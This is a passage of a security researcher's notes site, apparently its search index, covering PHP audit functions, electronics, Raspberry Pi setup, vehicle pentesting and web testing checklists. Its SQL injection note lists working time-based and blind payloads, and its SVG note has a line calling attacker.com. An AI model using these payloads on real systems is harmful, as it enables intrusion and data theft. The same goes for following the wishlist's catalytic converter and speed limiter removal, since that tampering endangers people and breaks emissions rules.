=\u0026gt; 1, \u0026#39;call_user_func\u0026#39; =\u0026gt; 0, \u0026#39;call_user_func_array\u0026#39; =\u0026gt; 0, \u0026#39;register_shutdown_function\u0026#39; =\u0026gt; 0, \u0026#39;register_tick_function\u0026#39; =\u0026gt; 0, \u0026#39;set_error_handler\u0026#39; =\u0026gt; 0, \u0026#39;set_exception_handler\u0026#39; =\u0026gt; 0, \u0026#39;session_set_save_handler\u0026#39; =\u0026gt; array(0, 1, 2, 3, 4, 5), \u0026#39;sqlite_create_aggregate\u0026#39; =\u0026gt; array(2, 3), \u0026#39;sqlite_create_function\u0026#39; =\u0026gt; 2, Information Disclosure\nphpinfo posix_mkfifo posix_getlogin posix_ttyname getenv get_current_user proc_get_status get_cfg_var disk_free_space disk_total_space diskfreespace getcwd getlastmo getmygid getmyinode getmypid getmyuid Other Notable Functions\nextract - Opens the door for register_globals attacks (see study in scarlet). parse_str - works like extract if only one argument is given. putenv ini_set mail - has CRLF injection in the 3rd parameter, opens the door for spam. header - on old systems CRLF injection could be used for xss or other purposes, now it is still a problem if they do a header(\u0026#34;location: ...\u0026#34;); and they do not die();. The script keeps executing after a call to header(), and will still print output normally. This is nasty if you are trying to protect an administrative area. proc_nice proc_terminate proc_close pfsockopen fsockopen apache_child_terminate posix_kill posix_mkfifo posix_setpgid posix_setsid posix_setuid Filesystem Functions\nRead up more on PHP Filesystem Functions. Investigate all filesystem handlers as a part of the analysis.\nReferences\nStackoverflow (1), Stackoverflow (2), SecLists.org\n",url:"https://duraki.github.io/notes/php-source-code-analysis/"},"https:\/\/duraki.github.io\/notes\/posts\/":{title:"Posts",tags:[],content:"",url:"https://duraki.github.io/notes/posts/"},"https:\/\/duraki.github.io\/notes\/potentiometers\/":{title:"Potentiometers",tags:[],content:"A Potentiometer produces a gradually changing voltage signal to a Control Module. The signal is infinitely variable, with-in the operating range of the sensor.\nThis varying voltage reflects a mechanical movement or position of the potentiometer internal arm and its related components.\n.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  Potentiometer - Signal internal flow  Typical Application of Potentiometers  Pedal Position Sensors Throttle Position Sensors Feedback Potentiometers \u0026hellip;  ",url:"https://duraki.github.io/notes/potentiometers/"},"https:\/\/duraki.github.io\/notes\/ptc-sensors\/":{title:"PTC Sensors",tags:[],content:"PTC (Positive Temperature Coefficient) sensors is a type of DC Analog Sensor which change resistance based on temperature.\nIn a PTC sensor, as the temperature goes up, the resistance also goes up. The increase in resistance causes the voltage drop across the sensor to increase, and the input signal voltage at the Control Module increases.\nWhen troubleshooting a faulty input display, the input signal must be verified as VALID before the Control Module is replaced.\nWhen checking a PTC/NTC Sensor, look for these voltages and problems:\n If it\u0026rsquo;s 0V, no supply voltage or shorted to ground If it\u0026rsquo;s 2V, sensor is indicating a warm condition for system being measured If it\u0026rsquo;s 4V, sensor is indicating a cold condition for system being measured If it\u0026rsquo;s 5V, sensor or wiring harness is open  Remember: A PTC type sensor will indicate opposite results on intermediate readings (i.e. 4V, sensor is indicating warm condition).\n",url:"https://duraki.github.io/notes/ptc-sensors/"},"https:\/\/duraki.github.io\/notes\/pure-reverse-engineering\/":{title:"Pure Reverse Engineering",tags:[],content:"Some internal knowledge have been shared here. Otherwise, check references below.\nUse Byteman to instrument compiled Java application and Jar based files. A sample script has been included in the notes.\nHopper Disassembler In case Hopper Disas is \u0026ldquo;Not Responding\u0026rdquo; due to large binary loaded you can:\n Wait a bit more, close all unused apps, especially (Chrome) tabs Open Activity Monitor and check Hopper process details If nothing works, use the command below to purge all unused virtual memory  % purge # =\u0026gt; ... wait a bit # =\u0026gt; hopper disas. should be unfrezzed and responding References\n Debugging iOS binaries with lldb Bypass Flutter SSL Pinning (2021) Frida Android Function Enumerator and Dumper  ",url:"https://duraki.github.io/notes/pure-reverse-engineering/"},"https:\/\/duraki.github.io\/notes\/raspberry-pi-quick-guide\/":{title:"Raspberry Pi Quick Guide",tags:[],content:"Installation  Use NOOBS or Raspberry Pi official image for hardware environment (ie. PCBs, Electrical Engineering, Breadboard Wiring, Prototypes et al.) Use SD Card Formatter to quickly partition-overwrite whole SD Card Disk Use balenaEtcher to quickly write arm_os of your choice Use Raspberry Pi Imager to quickly write Raspbian OS with custom configuration  Configuration Upon installing your favorite *.img on your SD Card, make sure to boot the Raspberry Pi at least once, to finish configuration wizard with-in Raspbian OS. Your Raspberry Pi will not boot up!, unless you go through this wizard at least once (requires monitor/mouse/kb).\nYou can check your Hostname configuration, by issuing command on your Pi:\n$ hostname -I You can use the hostname value, rather then directly connecting to the IP address (if not set statically).\n$ ping pi@raspberrypi.local Make sure to configure WiFi connection as well.\nSet APT sources to closer country Search Raspbian Mirros on official website, and select the country closest to yours. Here is the example with Slovenia:\nEurope* Slovenia ARNES (ftp|http)://ftp.arnes.si/mirrors/raspbian/raspbian rsync://ftp.arnes.si/raspbian/ Edit the sources.list:\n$ sudo vim /etc/apt/sources.list # =\u0026gt; comment the first `# deb` line, and add this below it # dep http://ftp.arnes.si/mirrors/raspbian/raspbian/ bullseye main contrib non-free rpi Update the changes:\n$ sudo apt update Upgrading the System Packages is simple as:\n$ sudo apt upgrade -y Upgrading Rasbian OS Kernel Updating Raspberry Pi packages (Tested)\nFor details check Raspberry Pi documentation on updating and upgrading the OS.\n# =\u0026gt; full-upgrade is used in preference to a simple upgrade, as it also picks up any dependency changes that may have been made $ sudo apt full-upgrade Updating Raspberry Pi Kernel (Untested)\nUsing rpi-update will update your Raspberry Pi OS kernel and VideoCore firmware to the latest pre-release versions.\n$ sudo rpi-update $ sudo reboot For a full list of options, check documentation in the rpi-update repository.\nDowngrading Raspbian OS Kernel If you have done an rpi-update and things are not working as you wish, if your Raspberry Pi is still bootable you can return to the stable release using:\n$ sudo apt-get update $ sudo apt install --reinstall libraspberrypi0 libraspberrypi-{bin,dev,doc} raspberrypi-bootloader raspberrypi-kernel Update Raspberry Pi EEPROM Updating the bootloader of your Raspberry Pi to the latest preview version is an optional step. You may perform this only if you are facing any problems with your Pi.\nYou can check whether any updates are available for install by running the following command.\n$ sudo rpi-eeprom-update If any available update is there, you can give the following command to update Raspberry Pi EEPROM.\n$ sudo rpi-eeprom-update -a $ sudo reboot Clean Up some space You can do some clean to remove all cached .deb archived stored in /var/cache/apt/archives:\n$ sudo apt clean Post-install Settings Remove the SD Card from your Raspberry Pi after base configuration and wizard setup, and use your MacOS to mount it in your working directory. The instructions are under MacOS Notes down to the bottom.\n Insert SD Card in your card reader Make a directory for mounting Linux partition Make changes to the Raspbian OS directly from /boot  You can use this to edit boot configuration files, enable SSH etc. directly from your Raspbian HDD.\nRead the following to Enable SSH on via SD Card.\nInstall VNC on Raspberry Pi The standard image of the Raspberry Pi OS comes with RealVNC Connect software. If required for a custom OS, do it via:\n$ sudo apt install realvnc-vnc-server realvnc-vnc-viewer Otherwise, use raspi-config from the Terminal, and enable the VNC in:\nInterface Options =\u0026gt; VNC =\u0026gt; Enable VNC Display Options =\u0026gt; VNC Resolution =\u0026gt; 1280x1024 System Options =\u0026gt; Boot / Auto Login =\u0026gt; Desktop Autologin =\u0026gt; Enable Upon changing the settings, reboot your Raspberry Pi and connect from the MacOS using VNCViewer.\nReferences and Links  Raspberry Pi Official Documentation RPI Configuration Parameters Raspberry Pi Guide  ",url:"https://duraki.github.io/notes/raspberry-pi-quick-guide/"},"https:\/\/duraki.github.io\/notes\/re\/":{title:"RE",tags:[],content:" Tricks and Tips WinDbg Cheatsheets Byteman Cheatsheets Byteman Scripts MacOS Reverse Engineering  Ghidra and Related LLDB for MacOS Hopper for MacOS   iOS Reverse Engineering  Frida \u0026amp; Objection Tutorial Pure Reverse Engineering LLDB Cycript Decrypt IPA from AppStore iOS Jailbreak Bypass iOS Static Analysis   Android Reverse Engineering  Frida \u0026amp; Objection Tutorial Frida Gadget Injection on Android Android Recompilation   OPCRouter Research [wip]  ",url:"https://duraki.github.io/notes/re/"},"https:\/\/duraki.github.io\/notes\/reverse-engineering-tricks-and-tips\/":{title:"Reverse Engineering Tricks and Tips",tags:[],content:" Find threads by patching a jump with a short jump (EB FE) to create an endless loop you can then search for Looking for \u0026ldquo;CO A8\u0026rdquo; to find local IP addr prefix (192.168) Looking for 4-byte Unix timestamps in hex in a file format or a network packet Search/google all application constant values, classes and libraries Resize Hex Editor window to identify unknown structures and its sizes Check application Log messages and Xref them Replace all https calls with http (instead of hooking on each TLS thread and decrypting SSL) Using LD_PRELOAD to disable specific functions or patching binaries on the fly Use Burp + mitm_relay to proxy traffic Decompile JAR and attack via Frida, Byteman or any other dynamic instrumentation toolkit Use dotPeek to identify and process attack surface for anything .NET based  ",url:"https://duraki.github.io/notes/reverse-engineering-tricks-and-tips/"},"https:\/\/duraki.github.io\/notes\/sbc-and-alternatives\/":{title:"SBC and Alternatives",tags:[],content:"This document explains common use during the operation of SBC (Single-board Computers), such is Raspberry Pi, Banana Pi and others.\nDetail instruction for SBC(s) below:\n Raspberry Pi Installation and Configuration Banana Pro Installation and Configuration  Check How to mount SD Cards notes for instruction on how to mount /boot and ext4 partitions directly from the Host OS. Some ext4 partition mounting explained in MacOS Notes.\nDetailed instructions for Enabling SSH on Raspbian OS are also available.\nRaspberry Pi GPIO A powerful feature of the Raspberry Pi is the row of GPIO (general-purpose input/output) pins along the top edge of the board. A 40-pin GPIO header is found on all current Raspberry Pi boards (unpopulated on Raspberry Pi Zero, Raspberry Pi Zero W and Raspberry Pi Zero 2 W). Prior to the Raspberry Pi 1 Model B+ (2014), boards comprised a shorter 26-pin header.\nAny of the GPIO pins can be designated (in software) as an input or output pin and used for a wide range of purposes.\n A handy reference can be accessed on the Raspberry Pi by opening a terminal window and running the command pinout.\n  GPIO and the 40-pin Headers  ",url:"https://duraki.github.io/notes/sbc-and-alternatives/"},"https:\/\/duraki.github.io\/notes\/server-anywhere\/":{title:"Server Anywhere",tags:[],content:"Each of these commands will run an ad hoc http static server in your current (or specified) directory, available at http://localhost:8000. Use this power wisely.\nDiscussion on reddit.\nPython 2.x $ python -m SimpleHTTPServer 8000 Python 3.x $ python -m http.server 8000 Twisted (Python) $ twistd -n web -p 8000 --path . Or:\n$ python -c \u0026#39;from twisted.web.server import Site; from twisted.web.static import File; from twisted.internet import reactor; reactor.listenTCP(8000, Site(File(\u0026#34;.\u0026#34;))); reactor.run()\u0026#39; Depends on Twisted.\nRuby $ ruby -rwebrick -e\u0026#39;WEBrick::HTTPServer.new(:Port =\u0026gt; 8000, :DocumentRoot =\u0026gt; Dir.pwd).start\u0026#39; Credit: Barking Iguana\nRuby 1.9.2+ $ ruby -run -ehttpd . -p8000 Credit: nobu\nadsf (Ruby) $ gem install adsf # install dependency $ adsf -p 8000 Credit: twome\nNo directory listings.\nSinatra (Ruby) $ gem install sinatra # install dependency $ ruby -rsinatra -e\u0026#39;set :public_folder, \u0026#34;.\u0026#34;; set :port, 8000\u0026#39; No directory listings.\nPerl $ cpan HTTP::Server::Brick # install dependency $ perl -MHTTP::Server::Brick -e \u0026#39;$s=HTTP::Server::Brick-\u0026gt;new(port=\u0026gt;8000); $s-\u0026gt;mount(\u0026#34;/\u0026#34;=\u0026gt;{path=\u0026gt;\u0026#34;.\u0026#34;}); $s-\u0026gt;start\u0026#39; Credit: Anonymous Monk\nPlack (Perl) $ cpan Plack # install dependency $ plackup -MPlack::App::Directory -e \u0026#39;Plack::App::Directory-\u0026gt;new(root=\u0026gt;\u0026#34;.\u0026#34;);\u0026#39; -p 8000 Credit: miyagawa\nMojolicious (Perl) $ cpan Mojolicious::Lite # install dependency $ perl -MMojolicious::Lite -MCwd -e \u0026#39;app-\u0026gt;static-\u0026gt;paths-\u0026gt;[0]=getcwd; app-\u0026gt;start\u0026#39; daemon -l http://*:8000 No directory listings.\nhttp-server (Node.js) $ npm install -g http-server # install dependency $ http-server -p 8000 Note: This server does funky things with relative paths. For example, if you have a file /tests/index.html, it will load index.html if you go to /test, but will treat relative paths as if they were coming from /.\nnode-static (Node.js) $ npm install -g node-static # install dependency $ static -p 8000 No directory listings.\nPHP (\u0026gt;= 5.4) $ php -S 127.0.0.1:8000 Credit: /u/prawnsalad and MattLicense\nNo directory listings.\nErlang $ erl -s inets -eval \u0026#39;inets:start(httpd,[{server_name,\u0026#34;NAME\u0026#34;},{document_root, \u0026#34;.\u0026#34;},{server_root, \u0026#34;.\u0026#34;},{port, 8000},{mime_types,[{\u0026#34;html\u0026#34;,\u0026#34;text/html\u0026#34;},{\u0026#34;htm\u0026#34;,\u0026#34;text/html\u0026#34;},{\u0026#34;js\u0026#34;,\u0026#34;text/javascript\u0026#34;},{\u0026#34;css\u0026#34;,\u0026#34;text/css\u0026#34;},{\u0026#34;gif\u0026#34;,\u0026#34;image/gif\u0026#34;},{\u0026#34;jpg\u0026#34;,\u0026#34;image/jpeg\u0026#34;},{\u0026#34;jpeg\u0026#34;,\u0026#34;image/jpeg\u0026#34;},{\u0026#34;png\u0026#34;,\u0026#34;image/png\u0026#34;}]}]).\u0026#39; Credit: nivertech (with the addition of some basic mime types)\nNo directory listings.\nbusybox httpd $ busybox httpd -f -p 8000 Credit: lvm\nwebfs $ webfsd -F -p 8000 Depends on webfs.\nIIS Express C:\\\u0026gt; \u0026#34;C:\\Program Files (x86)\\IIS Express\\iisexpress.exe\u0026#34; /path:C:\\MyWeb /port:8000 Depends on IIS Express.\nCredit: /u/fjantomen\nNo directory listings. /path must be an absolute path.\n",url:"https://duraki.github.io/notes/server-anywhere/"},"https:\/\/duraki.github.io\/notes\/signals-table\/":{title:"Signals Table",tags:[],content:"Table    Symbol Type Cycle Desc. Function     SQR A High / Low Waveform Repeated Rapidly   B- D ON / OFF ON/OFF input Low Signal   B+ D ON / OFF ON/OFF input High Signal   V+   Voltage Positive Voltage Positive   GND   Ground Voltage Negative    \u0026gt; (where \u0026#34;SQR\u0026#34; - Square-Wave Signal) \u0026gt; (where \u0026#34;A\u0026#34; - Analog, \u0026#34;D\u0026#34; - Digital) Documentation  SQR Signal Documentation B- Documentation B+ Documentation  Bench Test Tricks and Tips  You can easily send required signal for B/type Switches, just by checking the Signal Type of the specific Pin. For example:  Pin 3, is a \u0026ldquo;Fuel Level Warning Light\u0026rdquo; on X13060. It has signal type B-. You can ground this pin and the light will turn on, indicating the Fuel Warning.    Signal Type ⇢ Component Using it  Square Wave  Diagnostic Module DME/DDE Control Unit Control Unit Control Module Read Axle reed contact Speed Sensor   Switched B+  Ignition Switch Light Switch Reed Switch Seat Belt Switch Hall Effect Switch Brake Light Switch Hazard Warning Relay Fog Light Switch Direction Switch Accessories (ACC) Wire   Switched B-  Door Position Switch Window Switches Sunroof Switch    Terminal Designations There is a terminal designation for almost every connection of a consumer or switch in the vehicle in order to facilitate the connection. The designation of the individual connections is defined in Germany according to DIN 72552.\nRefer to DIN 72552 page for more details.\n",url:"https://duraki.github.io/notes/signals-table/"},"https:\/\/duraki.github.io\/notes\/sqli-payloads\/":{title:"SQLi Payloads",tags:[],content:"More examples might be avilable on netspi\nClassical Sleep:\n0\u0026#39;XOR(if(now()=sysdate(),sleep(15),0))XOR\u0026#39;Z =\u0026gt; 20.002 0\u0026#39;XOR(if(now()=sysdate(),sleep(6),0))XOR\u0026#39;Z =\u0026gt; 7.282 0\u0026#39;XOR(if(now()=sysdate(),sleep(0),0))XOR\u0026#39;Z =\u0026gt; 0.912 0\u0026#39;XOR(if(now()=sysdate(),sleep(15),0))XOR\u0026#39;Z =\u0026gt; 16.553 0\u0026#39;XOR(if(now()=sysdate(),sleep(3),0))XOR\u0026#39;Z =\u0026gt; 3.463 0\u0026#39;XOR(if(now()=sysdate(),sleep(0),0))XOR\u0026#39;Z =\u0026gt; 1.229 0\u0026#39;XOR(if(now()=sysdate(),sleep(6),0))XOR\u0026#39;Z =\u0026gt; 7.79 /api/tweets?city_id=(select(0)from(select(sleep(25)))v) ’) AND 1234=(SELECT (CASE WHEN (1234=1234) THEN 1234 ELSE (SELECT 4376 UNION SELECT 4107) END))--+ type=sharesCountTw\u0026amp;url=http%3a%2f%2finsideok.ru%2flica\u0026amp;count=-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(25))A)) SQL in useragent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36\u0026#39;;WAITFOR DELAY ‘00:00:05’;-- Blind SQL Injection:\n# sleep on mysql 4.* 1\u0026#39; AND CASE (SUBSTRING(VERSION(), 1, 1)) WHEN 4 THEN SLEEP(10) ELSE NULL END AND \u0026#39;1 # sleep on mysql 5.* 1\u0026#39; AND CASE (SUBSTRING(VERSION(), 1, 1)) WHEN 5 THEN SLEEP(10) ELSE NULL END AND \u0026#39;1  ",url:"https://duraki.github.io/notes/sqli-payloads/"},"https:\/\/duraki.github.io\/notes\/svg-payloads\/":{title:"SVG Payloads",tags:[],content:"\u0026lt;rect fill=�url(//attacker.com/malicious.svg#exploit)�\u0026gt; (@see: https://hackerone.com/reports/347139) ",url:"https://duraki.github.io/notes/svg-payloads/"},"https:\/\/duraki.github.io\/notes\/switched-b-low-signals\/":{title:"Switched B- (Low) Signals",tags:[],content:"Akin to B+ Signal, this Ground Signal produces an ON/OFF type input to the Control Module. The voltage level will indicate a specific operating condition.\nThe only diference between a switched B- and switched B+ is the voltage, in which the signals are switched.\nThis type of signal can be seen in BMW\u0026rsquo;s Pinout diagrams, symboled by the B-.\n.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  B\u0026#43;/- Signal - Example of Operating Condition  Below is an example circuit that uses B- Digital Type Signal:\n.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  B- Signal - Example of ON/OFF Circuit  Typical Application of Switched B+  Door Position Switch Window Switches Sunroof Switch \u0026hellip;  ",url:"https://duraki.github.io/notes/switched-b-low-signals/"},"https:\/\/duraki.github.io\/notes\/switched-b-high-signals\/":{title:"Switched B\u002b (High) Signals",tags:[],content:"This DC (Digital) Type Signal produces an ON/OFF type input to the Control Module. The voltage level will indicate a specific operating condition.\nThis type of signal can be seen in BMW\u0026rsquo;s Pinout diagrams, symboled by the B+.\n.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper  .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; }  B\u0026#43; Signal - Example of ON/OFF Circuit  Typical Application of Switched B+  Ignition Switch Light Switch Reed Switch Seat Belt Switch Hall Effect Switch (e.g. Brake Light Switch) \u0026hellip;  ",url:"https://duraki.github.io/notes/switched-b-high-signals/"},"https:\/\/duraki.github.io\/notes\/tags\/":{title:"Tags",tags:[],content:"",url:"https://duraki.github.io/notes/tags/"},"https:\/\/duraki.github.io\/notes\/troubleshoot\/":{title:"Troubleshoot",tags:[],content:"Hardware Fix Kappa Headphones on Apple Macbook\n MacOS In case you get error, such is stderr: 0:137: execution error: dd: /dev/rdisk4: Operation not permitted, during the Raspberry Pi installation, or mounting of SD Cards, do the following:\n If the command reports dd: /dev/rdiskN: Operation not permitted, go to System Preferences -\u0026gt; Security \u0026amp; Privacy -\u0026gt; Privacy -\u0026gt; Files and Folders -\u0026gt; Give Removable Volumes access to Terminal.\n Linux Fix RHEL SD Card Reader (Red Hat Enterprise Linux)\n Fix RHEL VPN forward options (see above)\n Fix Wireless for Macbook Air on RHEL (see above)\nDedicated post has been published on my blog. RHEL gets kinda buggy on Macbook Air (Intel).\n Bypasses Chrome Enterprise Policy Bypass\nVery annoying on JAMF\u0026rsquo;d and managed devices. Basically, Company provides a laptop with a bloatware in a form of Chrome extension. This is a trick I discovered around 2016. You can bypass \u0026ldquo;Enterprise\u0026rdquo; limitation and remove the Chrome extension from reapperaing.\n VirtualBox || VMWare When in Kali Linux and doing Security Assessment\n Make sure to set VMWare Kali Box to use NAT (so the VPN connection can be shared from Host, ie. MacOS)  When installing VMWare from JAMF but it doesn\u0026rsquo;t work\n Install VMWare via JAMF Store (to obtain License Key) Backup the license-fusion-120-e3-202001 from the JAMF Store VMWare Installation Application Support Manually downloading the new DMG Removing the JAMF Store VMWare installation Installing the DMG and activating via above license  Guest addition shared folder does not work\n# =\u0026gt; Work in linux-based vmbox $ sudo /usr/bin/vmhgfs-fuse .host:/ /mnt/hgfs -o subtype=vmhgfs-fuse,allow_other Guest addition shared clipboard does not work\n# =\u0026gt; Start from Terminal or on Startup $ /usr/bin/vmware-user # =\u0026gt; Another option is to bring daemon $ vmtoolsd -n vmusr # =\u0026gt; For Microsoft Windows \u0026gt; taskkill /F /IM vmtoolsd.exe \u0026gt; \u0026#34;C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\u0026#34; -n vmusr Fix Kali Linux screen resolution\nxrandr --newmode \u0026#34;2560x1440_40.00\u0026#34; 201.00 2560 2720 2984 3408 1440 1443 1448 1476 +hsync +vsync xrandr --addmode Virtual1 2560x1440_40.00 xrandr --output Virtual1 --mode 2560x1440_40.00 Install XFCE4 + Openbox in Kali\n(Increases Speedyness)\n$ apt-get install kali-defaults kali-root-login desktop-base xfce4 xfce4-places-plugin xfce4-goodies openbox # =\u0026gt; login in xfce session $ openbox --replace \u0026amp; exit Burp Proxy When connecting to a new wi-fi or internet connection, make sure to:\n Click Network in the Taskbar Properties Configure Firewall and Security Settings In Windows Security, click \u0026ldquo;Allow an app through firewall\u0026rdquo; Click Change Settings Select Burp Proxy / Charles etc. and select all 3 checkboxes (Network, Home, Public)  ",url:"https://duraki.github.io/notes/troubleshoot/"},"https:\/\/duraki.github.io\/notes\/upgrade-wishlist\/":{title:"Upgrade\u002bWishlist",tags:[],content:"Upgrade: Dash Camera Preferably front and back, tho would appreciated frontal only. Current choice: XIAOMI 70mai Pro Plus A500 - ~80 EUR, XIAOMI Mi 70mai D01 ~50 EUR, XIAOMI Mi 70mai Pro D02 ~80 EUR\nUpgrade: DME/ECU Chip Tuning E34 Chip Tuning - Legit Provider Wtterauer Tuning Gmbh\n   - Series Stage 1     Displacement 1991    Performance 110 kW / 150 PS 122 kW / 166 PS +11%    ~5500 U/min ~5550 U/min   Acceleration \u0026mdash; ~0.39sec@0-100km/h   Torque 190 Nm 215 Nm +13%    ~4200 U/min ~4200 U/min   Top Speed 211 km/h 219 km/h          Price: 454,40 EUR     Katalysator Removal +349,00 EUR - The removal of the catalytic converter and the associated electronic adjustment lead to less exhaust gas pressure and thus to a better flow of exhaust gases and more agile driving behavior. Fuel Cut-off +349,00 EUR - By deactivating the overrun fuel cut-off, the fuel supply to the combustion engine is no longer cut off. On the one hand, turbo engines can maintain their boost pressure and the popular boost popping occurs. VMax Nullification +699,00 EUR - Removes a software limited maximum speed, without performance increase.  Current data visible here.\n Upgrade: Professional Audio Upgrade ProAudi Gmbh. - Legit Provider Pro Audi Gmbh\nSelf upgrade alternatives:\n Hertz HCX 130   Upgrade: Radar/Laser/Safety Detector  Escort Inc Passport 7500, Radar/Laser/Safety Detector Cobra RAD 480i Laser Radar Detector Escort MAX360C Laser Radar Detector  ",url:"https://duraki.github.io/notes/upgrade-wishlist/"},"https:\/\/duraki.github.io\/notes\/vehicle-graybox-security-testing\/":{title:"Vehicle Graybox Security Testing",tags:[],content:"Security Testing Methods  Brute-force CAN fuzzer for fuzzing application software Interface scanner, layered fuzzing DoS, Replay Messages, Tampering Man in the Middle Read and write into flash dump (extract keys, certificates, sensitive data)  Security Testing in Practice  Send out particular frame IDs using IG Generator Mount network-based attacks like DoS, MiTM, Tampering of Signals Access to debug ports like JTAG to extract + corrupt flash memory/firmware Flash dump - Look into sensitive data  Approach  Reconnaissance Start with market requirements Use customer-provided documents of the system, brochures, user manuals, published material and attacks and vulnerabilities of used components  Understand the Architecture  Analyze high-level architecture and interfaces to understand interaction between different components Use architecture model, system context, interface model, attack pathway, sequence diagram  Identify valued and protectable assets  Identify relevant assets, such is hardware, software, database, etc. Parse every requirement (requirement description) for a specific asset - Splut it into SFOP scheme (Safety, Finance, Operational Performance, Privacy)  Generate Penetration Test Cases  Do X and Y on CAN Do Z and W on LIN  Perform risk-based greybox PT   Re-create attack scenarios on devices to identify potential vulns\n  Injecting,tampering\n Software checks:  Invalid address Modified SW Odd address Invalid signature Invalid seed-key Downgrade software Secure boot?      Ques?  Can we read the key, flash? Can we modify the flash or CAN messages? Can we perform a DoS and make the service unavailable Whats the goal of the attacker? What can he misuse and abuse  ",url:"https://duraki.github.io/notes/vehicle-graybox-security-testing/"},"https:\/\/duraki.github.io\/notes\/vehicle-hacking-environment\/":{title:"Vehicle Hacking Environment",tags:[],content:"Using Docker and Kali Install Docker first:\n$ brew install docker # =\u0026gt; or use docker.io Use the following script:\n# ... install required kali-docker tools # setup vehicle hacking environment $ apt-get install -y build-essential $ apt-get install -y ruby $ apt-get install -y ruby-dev $ apt-get install -y rubygems $ gem install serialport -- --use-system-libraries $ apt-get -y install bluez # (for hcitool) $ apt-get install -y net-tools Using Virtual Vehicle environments jeep has been developed to offer offensive-security solution for penetration testing on vehicle systems and similar attributes.\n",url:"https://duraki.github.io/notes/vehicle-hacking-environment/"},"https:\/\/duraki.github.io\/notes\/vhost-enumeration\/":{title:"vhost Enumeration",tags:[],content:"vhost discovery via ffuf:\n# =\u0026gt; first, find the total char lenght when the vhost does not exists $ curl -s -H \u0026#34;Host: thisdoesntexists.target.ba\u0026#34; http://target.ba | wc -c 246 # =\u0026gt; now use ffuf + filtering options to find valid vhosts $ ffuf -w ~/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H \u0026#34;Host: FUZZ.target.ba\u0026#34; -u http://target.ba -fs 246 # -fc 404,403 vhost discovery via Ruby:\n$ git clone https://github.com/jobertabma/virtual-host-discovery.git $ cd virtual-host-discovery $ ruby scan.rb --ip=51.77.138.18 --host=target.ba =\u0026gt; then continue here\n",url:"https://duraki.github.io/notes/vhost-enumeration/"},"https:\/\/duraki.github.io\/notes\/web-application-penetration-test-checklist\/":{title:"Web Application Penetration Test Checklist",tags:[],content:"[+] Sql Injection Attack [+] Hibernate Query Language Injection [+] Direct OS Code Injection [+] XML Entity Injection [+] Broken Authentication and Session Management [+] Cross-Site Scripting (XSS) [+] Insecure Direct Object References [+] Security Misconfiguration [+] Sensitive Data Exposure [+] Missing Function Level Access Control [+] Cross-Site Request Forgery (CSRF) [+] Using Components with Known Vulnerabilities [+] Unvalidated Redirects and Forwards [+] Cross Site Scripting Attacks [+] Click Jacking Attacks [+] DNS Cache Poisoning [+] Symlinking – An Insider Attack [+] Cross Site Request Forgery Attacks [+] Remote Code Execution Attacks [+] Remote File inclusion [+] Local file inclusion [+] EverCookie [+] Denial oF Service Attack [+] Cookie Eviction [+] PHPwn [+] NAT Pinning [+] XSHM [+] MitM DNS Rebinding SSL/TLS Wildcards and [+] Quick Proxy Detection [+] Improving HTTPS Side Channel Attacks [+] Side Channel Attacks in SSL [+] Turning XSS into Clickjacking [+] Bypassing CSRF protections with ClickJacking [+] HTTP Parameter Pollution [+] URL Hijacking [+] Stroke Jacking [+] Fooling B64_Encode(Payload) on WAFs And Filters [+] MySQL Stacked Queries with SQL Injection. [+] Posting Raw XML cross-domain [+] Generic Cross-Browser Cross-Domain theft [+] Attacking HTTPS with Cache Injection [+] Tap Jacking [+] XSS - Track [+] Next Generation Click Jacking [+] XSSing Client-Side Dynamic HTML. [+] Stroke triggered XSS and Stroke Jacking [+] Lost iN Translation [+] Persistent Cross Interface Attacks [+] Chronofeit Phishing [+] SQLi Filter Evasion Cheat Sheet (MySQL) [+] Tabnabbing [+] UI Redressing [+] Cookie Poisoning [+] SSRF [+] Bruteforce of PHPSESSID [+] Blended Threats and JavaScript [+] Cross-Site Port Attacks [+] CAPTCHA Re-Riding Attack [+] Arbitrary file access [+] Binary planting [+] Blind SQL Injection [+] Blind XPath Injection [+] Brute force attack [+] Buffer overflow attack [+] Cache Poisoning [+] Cash Overflow [+] Clickjacking [+] Command injection attacks [+] Comment Injection Attack [+] Content Security Policy [+] Content Spoofing [+] Credential stuffing [+] Cross Frame Scripting [+] Cross Site History Manipulation (XSHM) [+] Cross Site Tracing [+] Cross-Site Request Forgery (CSRF) [+] Cross Site Port Attack (XSPA) [+] Cross-Site Scripting (XSS) [+] Cross-User Defacement [+] Custom Special Character Injection [+] Denial of Service [+] Direct Dynamic Code Evaluation (‘Eval Injection’) [+] Execution After Redirect (EAR) [+] Exploitation of CORS [+] Forced browsing [+] Form action hijacking [+] Format string attack [+] Full Path Disclosure [+] Function Injection [+] Host Header injection [+] HTTP Response Splitting [+] HTTP verb tampering [+] HTML injection [+] LDAP injection [+] Log Injection [+] Man-in-the-browser attack [+] Man-in-the-middle attack [+] Mobile code: invoking untrusted mobile code [+] Mobile code: non-final public field [+] Mobile code: object hijack [+] One-Click Attack [+] Parameter Delimiter [+] Page takeover [+] Path Traversal [+] Reflected DOM Injection [+] Regular expression Denial of Service – ReDoS [+] Repudiation Attack [+] Resource Injection [+] Server-Side Includes (SSI) Injection [+] Session fixation [+] Session hijacking attack [+] Session Prediction [+] Setting Manipulation [+] Special Element Injection [+] SMTP injection [+] SQL Injection [+] SSI injection [+] Traffic flood [+] Web Parameter Tampering [+] XPATH Injection [+] XSRF or SSRF [+] Image mime type injection [+] DNS [+] CRLF [+] 2FA [+] XSS [+] CSRF [+] SOP [+] SSRF [+] LFI \u0026amp; RFI [+] SQLi [+] File Upload [+] XXE [+] LDAP [+] MongoDB [+] IDOR [+] Web 